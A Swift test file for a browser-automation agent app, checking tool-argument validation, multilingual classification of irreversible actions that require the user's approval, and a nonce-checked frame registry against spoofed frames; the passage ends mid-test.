import AppKit
import Combine
import Foundation
import LocalAuthentication
import Network
import Testing
import WebKit
@testable import Changmun

/// The suites that use what the whole process shares (the AI's approvals and what it has read, the chat, what the tools
/// are doing) run one after another: each starts from nothing and leaves nothing, so none can answer for another.
@Suite(.serialized)
enum SharedAgentState {}

/// Polls until the condition holds or the time is up, and says which: a wait that ends as soon as there is something to see.
@MainActor
func waitUntil(_ seconds: Double = 5, _ condition: @MainActor () -> Bool) async -> Bool {
    let end = Date().addingTimeInterval(seconds)
    while Date() < end {
        if condition() { return true }
        try? await Task.sleep(for: .milliseconds(20))
    }
    return condition()
}

/// A page server on the loopback address, for the tests of what only a real load can show.
final class TinyServer: @unchecked Sendable {
    private let listener: NWListener
    private let respond: @Sendable (String, String) -> String
    private let lock = NSLock()
    private var seen: [String] = []
    private(set) var port: UInt16 = 0

    init(_ respond: @escaping @Sendable (String, String) -> String) async throws {
        self.respond = respond
        listener = try NWListener(using: .tcp, on: .any)
        // Weak: a late connection can arrive after a test let go of the server.
        listener.newConnectionHandler = { [weak self] connection in
            connection.start(queue: .global())
            connection.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, _, _ in
                guard let self else { return connection.cancel() }
                let head = String(decoding: data ?? Data(), as: UTF8.self).split(separator: "\r\n").first.map(String.init) ?? ""
                let parts = head.split(separator: " ").map(String.init)
                let method = parts.first ?? "", path = parts.count > 1 ? String(parts[1].split(separator: "?").first ?? "") : ""
                lock.lock(); seen.append(method); lock.unlock()
                let body = self.respond(method, path)
                let reply = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: \(body.utf8.count)\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n" + body
                connection.send(content: Data(reply.utf8), completion: .contentProcessed { _ in connection.cancel() })
            }
        }
        port = try await withCheckedThrowingContinuation { continuation in
            let once = NSLock()
            var done = false
            listener.stateUpdateHandler = { [weak self] state in
                once.lock(); defer { once.unlock() }
                guard !done else { return }
                switch state {
                case .ready: done = true; continuation.resume(returning: self?.listener.port?.rawValue ?? 0)
                case .failed(let error): done = true; continuation.resume(throwing: error)
                default: break
                }
            }
            listener.start(queue: .global())
        }
    }

    func url(_ path: String) -> URL { URL(string: "http://127.0.0.1:\(port)\(path)")! }

    func count(_ method: String) -> Int {
        lock.lock(); defer { lock.unlock() }
        return seen.filter { $0 == method }.count
    }

    func stop() { listener.cancel() }
}

extension SharedAgentState {
    @MainActor @Suite
    struct ToolArgumentTests {
        @Test func onlyNamedKeysAreAllowedInAnyLetterCase() {
            for name in AgentKey.names { #expect(AgentKey.name(name) == name) }
            #expect(AgentKey.name("enter") == "Enter" && AgentKey.name(" ARROWDOWN ") == "ArrowDown" && AgentKey.name("pagedown") == "PageDown")
            for bad: Any in ["a", "A", "1", "-", "F5", "Ctrl+C", "Enter Enter", "Enter\nx", "Enter,Tab", "", "Esc", "Return", " ", 5, ["Enter"]] {
                #expect(AgentKey.name(bad) == nil, "\(bad)")
            }
            #expect(AgentKey.name(nil) == nil)
        }

        @Test func modifiersAreTheFourOrTheirUsualNames() {
            #expect(AgentKey.modifiers(nil) == ["shift": false, "alt": false, "ctrl": false, "meta": false])
            #expect(AgentKey.modifiers(["Shift", "control", "cmd", "option"]) == ["shift": true, "alt": true, "ctrl": true, "meta": true])
            #expect(AgentKey.modifiers(["shift"]) == ["shift": true, "alt": false, "ctrl": false, "meta": false])
            #expect(AgentKey.modifiers(["super"]) == nil)
            #expect(AgentKey.modifiers("shift") == nil)
            #expect(AgentKey.modifiers([1]) == nil)
        }

        @Test func theKeyToolOnlyOffersTheNamedKeys() throws {
            let tool = try #require(ToolCatalog.definitions.first { $0["name"] as? String == "press_key" })
            let schema = try #require(tool["inputSchema"] as? [String: Any])
            let properties = try #require(schema["properties"] as? [String: Any])
            #expect((properties["key"] as? [String: Any])?["enum"] as? [String] == AgentKey.names)
            #expect(schema["required"] as? [String] == ["key"])
        }

        @Test func everyNewToolIsOffered() throws {
            let required = ["click_at": ["x", "y"], "press_key": ["key"], "select_option": ["element_id", "option"], "hover": ["element_id"], "wait_for": [], "drag": []]
            for (name, needed) in required {
                let tool = try #require(ToolCatalog.definitions.first { $0["name"] as? String == name }, "\(name)")
                let schema = try #require(tool["inputSchema"] as? [String: Any])
                #expect(schema["required"] as? [String] == needed, "\(name)")
                #expect((schema["properties"] as? [String: Any])?["tab_id"] != nil, "\(name)")
            }
            #expect(ToolCatalog.definitions.count == Set(ToolCatalog.definitions.compactMap { $0["name"] as? String }).count)
        }

        @Test func theToolsSayWhatTheyCantReachAndWhenTheyAsk() throws {
            func description(_ name: String) throws -> String {
                try #require(ToolCatalog.definitions.first { $0["name"] as? String == name }?["description"] as? String)
            }
            #expect(try description("read_page").contains("shadow DOM") && description("click_at").contains("shadow DOM"))
            #expect(try description("click").contains("asks the user before every click"))
        }

        @Test func badArgumentsAreRefusedBeforeAnyTabIsTouched() {
            let bad: [(String, [String: Any])] = [
                ("press_key", [:]), ("press_key", ["key": "a"]), ("press_key", ["key": "Enter", "modifiers": ["super"]]), ("press_key", ["key": "Enter", "element_id": "x"]),
                ("select_option", ["element_id": 1]), ("select_option", ["option": "A"]), ("select_option", ["element_id": 1, "option": ""]),
                ("hover", [:]), ("hover", ["element_id": "x"]),
                ("click_at", [:]), ("click_at", ["x": 5]), ("click_at", ["x": -1, "y": 5]), ("click_at", ["x": "a", "y": 5]), ("click_at", ["x": 1e30, "y": 5]),
                ("wait_for", ["text": ""]), ("wait_for", ["text": "  \n "]), ("wait_for", ["text": "\u{FEFF}"]), ("wait_for", ["text": "\u{00A0}\u{3000}\u{2028}"]), ("wait_for", ["text": 5]), ("wait_for", ["gone": true]), ("wait_for", ["text": "a", "timeout": 0]), ("wait_for", ["text": "a", "timeout": "soon"]), ("wait_for", ["text": "a", "gone": "yes"]),
                ("drag", [:]), ("drag", ["from_element_id": 1]), ("drag", ["from_element_id": 1, "from_x": 1, "from_y": 2, "to_element_id": 3]), ("drag", ["from_x": 1, "to_x": 3, "to_y": 4]),
                ("hover", ["element_id": 1e20]), ("select_option", ["element_id": 1e20, "option": "a"]), ("drag", ["from_element_id": 1e20, "to_element_id": 2]),
            ]
            for (name, args) in bad { #expect(ToolCatalog.validate(name, args) != nil, "\(name) \(args)") }
            let good: [(String, [String: Any])] = [
                ("press_key", ["key": "enter"]), ("press_key", ["key": "Tab", "modifiers": ["shift"], "element_id": 4]),
                ("select_option", ["element_id": 1, "option": "Green"]), ("hover", ["element_id": 2]), ("click_at", ["x": 10, "y": 20.5]), ("click_at", ["x": "10", "y": "20"]),
                ("wait_for", [:]), ("wait_for", ["text": "Done"]), ("wait_for", ["text": "Done", "gone": true, "timeout": 30]),
                ("drag", ["from_element_id": 1, "to_element_id": 2]), ("drag", ["from_x": 1, "from_y": 2, "to_x": 3, "to_y": 4]), ("drag", ["from_element_id": 1, "to_x": 3, "to_y": 4]),
            ]
            for (name, args) in good { #expect(ToolCatalog.validate(name, args) == nil, "\(name) \(args)") }
        }

        @Test func aNumberTooBigForAnIntegerIsNotOneAndDoesNotCrash() {
            for huge: Any in [1e20, -1e20, Double.greatestFiniteMagnitude, "99999999999999999999", Double.infinity, Double.nan] { #expect(ToolCatalog.int(huge) == nil, "\(huge)") }
            #expect(ToolCatalog.int(3.0) == 3 && ToolCatalog.int("12") == 12 && ToolCatalog.int(7) == 7)
            #expect(ToolCatalog.int(3.5) == nil && ToolCatalog.int("x") == nil && ToolCatalog.int(nil) == nil)
        }

        @Test func aNumberTooBigForAnIntegerIsRefusedByTheTools() async {
            for (name, args) in [("click", ["element_id": 1e20]), ("hover", ["element_id": 1e20]), ("click_at", ["x": 1e20, "y": 3.0]), ("select_option", ["element_id": 1e20, "option": "a"])] as [(String, [String: Any])] {
                let result = await ToolCatalog.call(name, args, caller: "test-huge")
                #expect(result.isError, "\(name)")
            }
        }

        @Test func theNewToolsHaveCommandLines() throws {
            #expect(try CLI.parse(["click-at", "10", "20.5"]) == .call("click_at", ["x": 10.0, "y": 20.5], output: nil))
            #expect(try CLI.parse(["press", "enter"]) == .call("press_key", ["key": "Enter"], output: nil))
            #expect(try CLI.parse(["press", "Tab", "--shift", "--element", "#4", "--tab", "2"])
                    == .call("press_key", ["key": "Tab", "modifiers": ["shift"], "element_id": 4, "tab_id": 2], output: nil))
            #expect(try CLI.parse(["select", "3", "United", "States"]) == .call("select_option", ["element_id": 3, "option": "United States"], output: nil))
            #expect(try CLI.parse(["hover", "7"]) == .call("hover", ["element_id": 7], output: nil))
            #expect(try CLI.parse(["drag", "3", "10,20"]) == .call("drag", ["from_element_id": 3, "to_x": 10.0, "to_y": 20.0], output: nil))
            #expect(try CLI.parse(["wait"]) == .call("wait_for", [:], output: nil))
            #expect(try CLI.parse(["wait", "Order", "placed", "--timeout", "20"]) == .call("wait_for", ["text": "Order placed", "timeout": 20.0], output: nil))
            #expect(try CLI.parse(["wait", "Loading", "--gone"]) == .call("wait_for", ["text": "Loading", "gone": true], output: nil))
            for bad in [["click-at", "1"], ["click-at", "-1", "2"], ["click-at", "a", "b"], ["press"], ["press", "a"], ["press", "Enter", "Tab"], ["select", "3"], ["select", "x", "A"], ["hover"],
                        ["drag", "1"], ["drag", "1", "x,y"], ["drag", "1", "2,3,4"], ["wait", "--gone"], ["wait", "x", "--timeout", "0"], ["press", "Enter", "--element"]] {
                #expect(throws: CLI.UsageError.self, "\(bad)") { try CLI.parse(bad) }
            }
            for bad in [["click-at", "inf", "5"], ["click-at", "5", "nan"], ["click-at", "1e999", "2"], ["wait", "x", "--timeout", "inf"], ["wait", "x", "--timeout", "nan"], ["drag", "1", "inf,2"], ["drag", "nan,1", "2"]] {
                #expect(throws: CLI.UsageError.self, "\(bad)") { try CLI.parse(bad) }
            }
            for word in ["click-at", "press", "select", "hover", "drag", "wait"] { #expect(CLI.usage.contains("changmun \(word)")) }
        }

        @Test func aFlagACommandHasNoUseForIsAnErrorNotSkipped() throws {
            for bad in [["click", "3", "--submit"], ["read", "--gone"], ["hover", "3", "--timeout", "5"], ["click", "3", "--shift"], ["type", "3", "x", "--element", "4"], ["tabs", "--max", "5"],
                        ["scroll", "down", "-o", "x.jpg"], ["wait", "x", "--submit"], ["open", "example.com", "--tab", "3"], ["read-tabs", "1", "2", "--tab", "3"]] {
                #expect(throws: CLI.UsageError.self, "\(bad)") { try CLI.parse(bad) }
            }
            // Each flag still works where it belongs.
            #expect(try CLI.parse(["type", "3", "hi", "--submit"]) == .call("type_text", ["element_id": 3, "text": "hi", "submit": true], output: nil))
            #expect(try CLI.parse(["read", "--max", "500", "--tab", "2"]) == .call("read_page", ["max_chars": 500, "tab_id": 2], output: nil))
            #expect(try CLI.parse(["screenshot", "-o", "x.jpg"]) == .call("screenshot", [:], output: "x.jpg"))
            #expect(try CLI.parse(["screenshot", "--labels", "--tab", "2"]) == .call("screenshot", ["labels": true, "tab_id": 2], output: nil))
            #expect(throws: CLI.UsageError.self) { try CLI.parse(["read", "--labels"]) }
        }

        @Test func coordinatesShownAreKeptToASaneRange() {
            #expect(ToolCatalog.pixels(12.7) == 12 && ToolCatalog.pixels("9") == 9)
            #expect(ToolCatalog.pixels(1e30) == 1_000_000 && ToolCatalog.pixels(-5) == 0 && ToolCatalog.pixels(nil) == 0 && ToolCatalog.pixels(Double.nan) == 0)
        }

        @Test func waitingForTextEndsOnlyOnAnAnswer() {
            #expect(ToolCatalog.waitIsOver(has: true, gone: false) && ToolCatalog.waitIsOver(has: false, gone: true))
            #expect(!ToolCatalog.waitIsOver(has: false, gone: false) && !ToolCatalog.waitIsOver(has: true, gone: true))
            // A look at the page that got no answer is neither "there" nor "gone".
            #expect(!ToolCatalog.waitIsOver(has: nil, gone: true) && !ToolCatalog.waitIsOver(has: nil, gone: false))
        }
    }

    struct IrreversibleActionTests {
        private typealias Tier = IrreversibleAction.Tier

        private func tier(_ names: String..., hints: [String] = [], submits: Bool = false, payment: Bool = false, action: String = "", sends: Bool = false, link: Bool = false, keyRisk: Bool = false, cookie: Bool = false, banner: Bool = false) -> Tier {
            IrreversibleAction.tier(of: .init(label: names.first ?? "", names: names, hints: hints, submits: submits, payment: payment, action: action, sends: sends, link: link, keyRisk: keyRisk, cookie: cookie, banner: banner))
        }

        private func high(_ names: String...) -> Bool { names.allSatisfy { tier($0) == .high } }
        private func low(_ names: String...) -> Bool { names.allSatisfy { tier($0) == .low } }
        private func none(_ names: String...) -> Bool { names.allSatisfy { tier($0) == .none } }

        @Test func buttonsThatPayOrderSendPostDeleteTransferOrCancelAreTheHighTierInSevenLanguages() {
            let asked = [
                "Buy now", "Pay $19.99", "Place order", "Place Order", "Proceed to checkout", "Check out", "Send", "Send message", "Post", "Publish", "Delete account", "Transfer funds",
                "Confirm", "CONFIRM PAYMENT", "Donate", "Tweet", "Repost", "Retweet", "Withdraw", "Deposit", "Wire transfer", "Merge pull request", "Approve",
                "Unsubscribe", "Cancel subscription", "Cancel my order", "Cancel membership", "Cancel booking", "Close account", "Close my account", "Deactivate", "Terminate", "Revoke access",
                "Move to Trash", "Empty trash", "Empty the bin", "Erase", "Wipe", "Delete forever", "Remove permanently", "Make a payment", "Sell", "Place bid", "Invest", "Trade",
                "구매하기", "결제하기", "주문 완료", "보내기", "전송", "게시", "삭제", "송금", "탈퇴", "해지하기", "휴지통으로 이동", "출금", "입금", "계정 삭제",
                "購入する", "お支払い", "注文を確定する", "送信", "投稿", "削除", "送金", "退会する", "解約", "ゴミ箱", "出金", "入金",
                "立即购买", "去支付", "提交订单", "发送", "发布", "删除", "转账", "确认订单", "下單", "結算", "注销账户", "取消订阅", "垃圾桶", "提现", "汇款",
                "Comprar ahora", "Pagar", "Realizar pedido", "Finalizar compra", "Enviar", "Publicar", "Eliminar", "Transferir", "Confirmar", "Papelera",
                "Jetzt kaufen", "Zahlungspflichtig bestellen", "Bestellung abschicken", "Senden", "Veröffentlichen", "Löschen", "Überweisen", "Bestätigen", "Zur Kasse", "Papierkorb",
                "Acheter", "Payer maintenant", "Passer la commande", "Envoyer", "Publier", "Supprimer", "Virement", "Confirmer", "Valider", "Résilier",
            ]
            for name in asked { #expect(tier(name) == .high, "\(name)") }
        }

        @Test func publishingSharingGrantingAndSendingDataAreTheHighTierInSevenLanguages() {
            let asked = [
                "Reply", "Comment", "Submit", "Share", "Upload", "Authorize", "Grant access", "Connect", "Invite", "Subscribe", "Book", "Book now", "Reserve",
                "Allow", "Accept", "I agree", "Allow access", "Link account", "Link your account", "Accept invitation",
                "Permitir", "Conceder acceso", "Autorizar", "Conectar", "Compartir", "Comentar", "Responder", "Subir", "Suscribirse", "Reservar", "Invitar",
                "Erlauben", "Zustimmen", "Akzeptieren", "Teilen", "Hochladen", "Verbinden", "Einladen", "Antworten", "Abonnieren", "Buchen", "Autorisieren", "Einreichen",
                "Accepter", "Autoriser", "Partager", "Commenter", "Téléverser", "Répondre", "Réserver", "Soumettre", "Inviter",
                "허용", "동의하고 계속", "수락", "공유", "댓글", "등록", "예약", "제출", "신청하기", "구독", "연결", "업로드", "초대", "답글",
                "許可", "同意する", "共有", "登録", "コメント", "接続", "アップロード", "返信", "予約する", "申し込み", "招待",
                "允许", "接受", "分享", "评论", "授权", "连接", "上传", "回复", "预订", "提交", "订阅", "邀请",
            ]
            for name in asked { #expect(tier(name) == .high, "\(name)") }
        }

        @Test func aCookieBannersConsentAndSettingsAreTheLowTierInSevenLanguages() {
            let settings = [
                "Save", "Save changes", "Remove", "Disconnect", "Unlink account", "Install", "Enable", "Disable", "Reset", "Clear all", "Empty cart", "Block", "Ban user",
                "Complete", "Finish", "Discard", "Cookie settings: Reject and save",
                "Guardar", "Instalar", "Restablecer", "Bloquear", "Desactivar", "Speichern", "Zurücksetzen", "Sperren", "Entfernen", "Installieren",
                "Enregistrer", "Installer", "Réinitialiser", "Bloquer", "Terminer",
                "저장", "설치", "초기화", "차단", "완료", "제거", "保存", "インストール", "リセット", "ブロック", "完了", "保存", "安装", "重置", "屏蔽", "完成", "清空",
            ]
            for name in settings { #expect(tier(name) == .low, "\(name)") }
            let banner = ["Accept all", "Allow all", "I agree", "Accept", "Permitir", "Zustimmen", "Accepter", "허용", "同意する", "允许", "接受"]
            for name in banner { #expect(tier(name, cookie: true) == .low && tier(name) == .high, "\(name)") }
            let said = ["Accept all cookies", "Allow cookies", "Alle Cookies akzeptieren", "Aceptar galletas, permitir", "쿠키 허용", "クッキーを許可", "Accepter les témoins"]
            for name in said { #expect(tier(name) == .low, "\(name)") }
            #expect(tier("Accept all cookies and pay now", cookie: true) == .high, "a banner's words don't make a payment a consent")
            // A consent manager's container, said by the markup alone, is the low tier too, but a decision that rests on nothing else.
            for name in banner { #expect(tier(name, banner: true) == .low, "\(name)") }
            #expect(IrreversibleAction.restsOnMarkup(.init(label: "Accept", names: ["Accept"], banner: true)))
            #expect(!IrreversibleAction.restsOnMarkup(.init(label: "Accept all cookies", names: ["Accept all cookies"], banner: true)), "its own name speaks of cookies")
            #expect(!IrreversibleAction.restsOnMarkup(.init(label: "Save", names: ["Save"], banner: true)), "a setting is the low tier with or without it")
            #expect(!IrreversibleAction.restsOnMarkup(.init(label: "Accept", names: ["Accept"], cookie: true)))
            #expect(tier("Accept and pay now", banner: true) == .high)
            #expect(IrreversibleAction.mentionsCookies("We use Cookies") && IrreversibleAction.mentionsCookies("쿠키 설정") && !IrreversibleAction.mentionsCookies("Allow access to your files"))
        }

        @Test func promotionsAndHeadlinesThatMerelyHaveAWordAreNotAsked() {
            #expect(none("Save 20%", "Save $5 today", "Save up to 50%", "Saving 30"))
            #expect(low("Save", "Save changes", "Save your seat"))
            #expect(none("My orders", "Purchases", "Orders placed this year"))
        }

        @Test func pagesAndListsThatMerelyContainAWordAreNotAskedAbout() {
            let quiet = [
                "게시판", "구매후기", "주문조회", "주문 내역", "결제수단", "投稿一覧", "公開日", "注文履歴", "支払い方法", "发布会", "新闻发布", "订单查询", "支付方式", "购买须知",
                "Aceptar", "Se connecter", "Log out", "Sign out", "Continue", "Learn how",
            ]
            for name in quiet { #expect(tier(name) == .none, "\(name)") }
            #expect(high("게시판 글 삭제", "注文履歴を削除", "发布会 发布"))
        }

        @Test func whereAControlGoesIsJudgedByTheWordsOfItsAddress() {
            func goes(_ destinations: String..., names: [String] = ["Continue"], link: Bool = false) -> Tier {
                IrreversibleAction.tier(of: .init(label: names[0], names: names, dests: destinations, link: link))
            }
            #expect(goes("/account/delete/confirm ") == .high && goes("/settings action delete") == .high && goes("action delete") == .high && goes("/api/deleteAccount") == .high && goes("javascript:confirmDelete()") == .high)
            #expect(goes("/cart/checkout") == .high && goes("/pay/now") == .high && goes("/messages/send") == .high && goes("/subscriptions/42/cancel") == .high && goes("/transfer") == .high && goes("delete") == .high)
            #expect(goes("/products/shoes", "/search q best shoes") == .none && goes("/borders") == .none && goes("/sender") == .none && goes("/account/settings") == .none && goes("sort price") == .none && goes() == .none)
            #expect(IrreversibleAction.Facts(["dests": ["/x/delete"]]).dests == ["/x/delete"])
        }

        @Test func aLinkIsJudgedByWholeSegmentsOfItsPathNotByTheWordsOfASlug() {
            func link(_ path: String) -> Tier { IrreversibleAction.tier(of: .init(label: "Continue", names: ["Continue"], dests: [path], link: true)) }
            #expect(link("/checkout") == .high && link("/cart/checkout") == .high && link("/pay") == .high && link("/account/delete") == .high && link("/Checkout/") == .high && link("/api/send") == .high)
            #expect(link("/news/why-we-should-delete-our-old-emails") == .none && link("/blog/how-to-send-a-letter") == .none && link("/2024/12/pay-gap-report") == .none)
            #expect(link("/deleted") == .none && link("/payments-faq") == .none && link("/senders") == .none && link("/shop/shoes") == .none && link("/cancel") == .none && link("/remove") == .none && link("") == .none)
            #expect(IrreversibleAction.linkGoesToHigh("/a/b/purchase") && !IrreversibleAction.linkGoesToHigh("/a/b/purchases") && !IrreversibleAction.linkGoesToHigh("/a/purchase-history"))
        }

        @Test func aKeyThatActsByItselfOrAMessageBoxSendingIsTheHighTier() {
            #expect(tier("Page", keyRisk: true) == .high && tier("Message", sends: true) == .high)
            #expect(tier("Message") == .none)
        }

        @Test func formsPostingToPlacesThatDeleteSendTransferOrCancelAreAsked() {
            for action in ["/account/delete", "https://bank.example/transfer", "/messages/send", "/orders/123/cancel", "/api/remove-item", "/api/deleteAll", "/unsubscribe", "/comments"] {
                #expect(IrreversibleAction.postsToCheckout(action), "\(action)")
            }
            for action in ["/search", "/sender", "/borders", "/post", "/login", "/account/profile", ""] { #expect(!IrreversibleAction.postsToCheckout(action), "\(action)") }
            #expect(tier("Go", submits: true, action: "/account/delete") == .high)
            #expect(tier("Go", submits: false, action: "/account/delete") == .none)
        }

        @Test func ordinaryControlsAreNotAskedAbout() {
            let quiet = [
                "Search", "Next", "Learn more", "Read more", "Close", "Sign in", "Log in", "Add to cart", "Cancel", "Open menu", "Menu", "Back", "Show details", "Posts", "Sender", "Ordinary",
                "OK", "Okay", "Done", "Got it", "Comments", "Books", "Booking.com", "Saved", "Cancel and go back",
                "검색", "다음", "로그인", "더 보기", "장바구니 담기", "닫기", "확인", "취소",
                "検索", "次へ", "ログイン", "詳細を見る", "カートに入れる", "確認", "確定", "キャンセル",
                "搜索", "下一页", "登录", "了解更多", "加入购物车", "确认", "確定", "取消",
                "Buscar", "Siguiente", "Iniciar sesión", "Añadir al carrito", "Cancelar",
                "Suchen", "Weiter", "Anmelden", "In den Warenkorb", "Abbrechen",
                "Rechercher", "Suivant", "Se connecter", "Ajouter au panier", "Annuler",
                "", "   ",
            ]
            for name in quiet { #expect(tier(name) == .none, "\(name)") }
        }

        @Test func accentsWidthAndCaseDontHideAKeyword() {
            #expect(high("ÜBERWEISEN", "uberweisen", "Veuillez ENVOYER", "ＢＵＹ"))
            #expect(high("Pay", "pay", "  PAY  ", "Buy-now", "Delete…"))
        }

        @Test func invisibleCharactersDontSplitAKeyword() {
            #expect(high("Bu\u{200B}y now", "De\u{200C}le\u{200D}te", "Pa\u{00AD}y", "Se\u{2060}nd", "\u{FEFF}Buy", "Del\u{202E}ete", "삭\u{200B}제", "購\u{200B}入"))
            #expect(none("Sear\u{200B}ch"))
        }

        @Test func aControlIsJudgedByEveryNameItHasAndTheHighestTierWins() {
            #expect(tier("Close", "Delete everything") == .high)
            #expect(tier("", "Delete") == .high && tier("Menu", "Pay now") == .high && tier("Go", "Send message") == .high)
            #expect(tier("Close", "Dismiss the notice") == .none)
            #expect(tier("Accept", "Pay now", cookie: true) == .high && tier("Close", "Accept cookies") == .low && tier("Close", "Accept") == .high)
        }

        @Test func aControlWithNoWordsIsToldByItsMarkup() {
            #expect(tier("", hints: ["fa fa trash o"]) == .high && tier("", hints: ["btn delete"]) == .high && tier("", hints: ["checkout"]) == .high && tier("", hints: ["action send"]) == .high)
            #expect(tier("", hints: ["btn primary", "icon save"]) == .low)
            #expect(tier("", hints: ["btn primary", "icon chevron"]) == .none && tier("", hints: []) == .none)
        }

        @Test func aSubmitButtonOfAPaymentFormIsAskedAboutWhateverItSays() {
            #expect(tier("Continue", submits: true, payment: true) == .high)
            #expect(tier("Next", submits: true, action: "https://shop.example/checkout/confirm") == .high)
            #expect(tier("Go", submits: true, action: "/orders/pay") == .high)
            #expect(tier("Continue", submits: false, payment: true) == .none, "a button that doesn't submit")
            #expect(tier("Search", submits: true, action: "https://shop.example/search") == .none)
            #expect(tier("Search", submits: true, action: "https://shop.example/borders") == .none)
            #expect(tier("Continue", submits: true) == .none)
        }

        @Test func theNameShownIsTheOneThatPutTheActionInItsTier() {
            #expect(IrreversibleAction.name(of: .init(label: "Message", names: ["Message", "Send"])) == "Send")
            #expect(IrreversibleAction.name(of: .init(label: "Go", names: ["Go"])) == "Go")
            #expect(IrreversibleAction.name(of: .init(label: "", hints: ["btn delete"])) == "btn delete")
            #expect(IrreversibleAction.name(of: .init(label: "Icon", hints: ["btn delete"])) == "Icon")
            #expect(IrreversibleAction.name(of: .init(label: "Close", names: ["Close", "Accept cookies", "Pay"]), tier: .low) == "Accept cookies")
            #expect(IrreversibleAction.name(of: .init(label: "Close", names: ["Close", "Accept", "Pay"], cookie: true), tier: .low) == "Accept")
        }

        @Test func factsComeFromThePagesAnswer() {
            let facts = IrreversibleAction.Facts(["label": "Place order", "names": ["Place order"], "hints": ["x"], "dests": ["/y"], "submits": true, "payment": true, "action": "https://x/pay", "sends": true, "link": true, "keyRisk": true, "cookie": true])
            #expect(facts == .init(label: "Place order", names: ["Place order"], hints: ["x"], dests: ["/y"], submits: true, payment: true, action: "https://x/pay", sends: true, link: true, keyRisk: true, cookie: true))
            #expect(IrreversibleAction.Facts(["cookie": true]).cookie && !IrreversibleAction.Facts([:]).cookie)
            #expect(IrreversibleAction.Facts([:]) == .init())
            #expect(IrreversibleAction.tier(of: .init()) == .none)
        }

        @Test func checkoutAddressesAreRecognisedByWholeWordsOfThePath() {
            #expect(IrreversibleAction.postsToCheckout("https://a.example/checkout") && IrreversibleAction.postsToCheckout("/cart/payment-intent") && IrreversibleAction.postsToCheckout("/api/v1/Orders"))
            #expect(!IrreversibleAction.postsToCheckout("https://a.example/search?q=order") && !IrreversibleAction.postsToCheckout("/borders") && !IrreversibleAction.postsToCheckout("") && !IrreversibleAction.postsToCheckout("::"))
        }
    }

    struct FrameRegistryTests {
        @Test func aFrameIsTakenOnlyWithTheNumberTheGreetingCarried() {
            var frames = FrameRegistry<String>()
            frames.expect(slot: "f1", nonce: "n1")
            // The page around the frame can greet it too, but can't know the number.
            frames.offer(slot: "f1", nonce: "guess", frame: "spoofed")
            #expect(frames.frame(for: "f1") == nil)
            frames.offer(slot: "f1", nonce: "n1", frame: "real")
            #expect(frames.frame(for: "f1") == "real")
            // A frame that answered before the read told the app its number is found once it does.
            frames.offer(slot: "f2", nonce: "early", frame: "early frame")
            #expect(frames.frame(for: "f2") == nil)
            frames.expect(slot: "f2", nonce: "early")
            #expect(frames.frame(for: "f2") == "early frame")
            // Another frame can't answer for a name with its own number.
            frames.offer(slot: "f1", nonce: "n-other", frame: "other")
            #expect(frames.frame(for: "f1") == "real")
        }

        @Test func aNewReadKeepsOnlyTheFramesItNames() {
            var frames = FrameRegistry<String>()
            frames.expect(slot: "f1", nonce: "n1")
            frames.expect(slot: "f2", nonce: "n2")
            frames.offer(slot: "f1", nonce: "n1", frame: "one")
            frames.offer(slot: "f2", nonce: "n2", frame: "two")
            frames.offer(slot: "f3", nonce: "n3", frame: "three")
            frames.beginRead()
            #expect(frames.frame(for: "f1") == nil && frames.known.isEmpty)
            frames.expect(slot: "f2", nonce: "n2")
            frames.endRead()
            #expect(frames.frame(for: "f2") == "two" && frames.frame(for: "f1") == nil && frames.frame(for: "f3") == nil)
            #expect(frames.offers.count == 1)
        }

        @Test func navigationForgetsEveryFrame() {
            var frames = FrameRegistry<String>()
            frames.expect(slot: "f1", nonce: "n1")
            frames.offer(slot: "f1", nonce: "n1", frame: "one")
            frames.reset()
            #expect(frames.frame(for: "f1") == nil && frames.offers.isEmpty && frames.known.isEmpty)
        }

        @Test func aDroppedFrameIsNotAskedAgainEvenIfItGreetsAgain() {
            var frames = FrameRegistry<String>()
            frames.expect(slot: "f1", nonce: "n1")
            frames.expect(slot: "f2", nonce: "n2")
            frames.offer(slot: "f1", nonce: "n1", frame: "one")
            frames.offer(slot: "f2", nonce: "n2", frame: "two")
            #expect(frames.known.map(\.slot).sorted() == ["f1", "f2"])
            frames.drop(slot: "f1")
            #expect(frames.known.map(\.frame) == ["two"] && frames.frame(for: "f1") == nil && frames.offers.count == 1)
            frames.offer(slot: "f1", nonce: "n1", frame: "one again")
            #expect(frames.frame(for: "f1") == nil, "only a new read names it again")
        }

        @Test func aLookIsGivenWhatIsLeftOfTheWaitButAtLeastASecondAndNeverMoreThanAFrameGets() {
            let now = Date()
            #expect(ToolCatalog.lookTimeout(until: now.addingTimeInterval(30), now: now) == ToolCatalog.frameTimeout)
            #expect(ToolCatalog.lookTimeout(until: now.addingTimeInterval(2.5), now: now) == 2.5)
            #expect(ToolCatalog.lookTimeout(until: now.addingTimeInterval(0.1), now: now) == 1)
            #expect(ToolCatalog.lookTimeout(until: now.addingTimeInterval(-3), now: now) == 1)
        }

        @Test func theListOfShownFramesIsCappedAndAnythingMissingCountsAsMore() {
            func list(_ count: Int) -> String {
                "[" + (0..<count).map { "{\"slot\":\"s\($0)\",\"nonce\":\"n\"}" }.joined(separator: ",") + "]"
            }
            #expect(ToolCatalog.shownFrames(from: nil) == nil && ToolCatalog.shownFrames(from: "not json") == nil && ToolCatalog.shownFrames(from: "{}") == nil)
            #expect(ToolCatalog.shownFrames(from: "[]")?.refs.isEmpty == true && ToolCatalog.shownFrames(from: "[]")?.more == false)
            let few = ToolCatalog.shownFrames(from: list(ToolCatalog.maxShownFrames))
            #expect(few?.refs.count == ToolCatalog.maxShownFrames && few?.more == false)
            let many = ToolCatalog.shownFrames(from: list(ToolCatalog.maxShownFrames + 1))
            #expect(many?.refs.count == ToolCatalog.maxShownFrames && many?.more == true, "the frames beyond the cap are not skipped silently")
            #expect(ToolCatalog.shownFrames(from: "[{\"slot\":\"s\"}]")?.more == true, "a frame that can't be named is one more unknown")
        }

        @Test func theFirstOfferOfANameWithANumberIsTheOneKept() {
            var frames = FrameRegistry<String>()
            frames.expect(slot: "f1", nonce: "n1")
            frames.offer(slot: "f1", nonce: "n1", frame: "first")
            frames.offer(slot: "f1", nonce: "n1", frame: "second")
            #expect(frames.frame(for: "f1") == "first" && frames.offers.count == 1)
        }

        @Test func aFloodOfOffersNobodyAskedForCantPushOutTheFramesTheReadsWaitFor() {
            var frames = FrameRegistry<Int>()
            for i in 0..<5 { frames.expect(slot: "real\(i)", nonce: "n") }
